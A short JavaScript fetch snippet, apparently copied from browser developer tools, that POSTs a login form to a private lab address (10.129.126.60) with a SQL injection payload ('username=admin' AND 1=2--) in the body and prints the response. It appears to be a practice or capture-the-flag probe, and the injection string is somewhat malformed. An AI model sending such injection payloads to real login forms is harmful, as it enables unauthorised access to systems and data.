fetch("http://10.129.126.60/", {
	headers: {
		accept:
			"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		"accept-language": "en-US,en;q=0.9,fr-FR;q=0.8,fr;q=0.7",
		"cache-control": "max-age=0",
		"content-type": "application/x-www-form-urlencoded",
		"upgrade-insecure-requests": "1",
	},
	referrer: "http://10.129.126.60/",
	referrerPolicy: "strict-origin-when-cross-origin",
	body: "'username=admin' AND 1=2--&password='",
	method: "POST",
	mode: "cors",
	credentials: "omit",
})
	.then((res) => res.text())
	.then((text) => {
		console.log(text);
	});
